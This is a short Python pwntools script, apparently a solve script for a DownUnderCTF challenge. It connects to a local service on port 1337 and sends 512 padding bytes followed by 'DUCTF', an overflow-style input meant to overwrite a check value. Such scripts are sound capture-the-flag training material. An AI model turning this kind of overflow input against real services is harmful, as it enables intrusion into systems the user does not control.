from pwn import *

conn = remote('0.0.0.0', 1337)
conn.sendline(b'x' * 512 + b'DUCTF')
print(conn.recvline().decode())
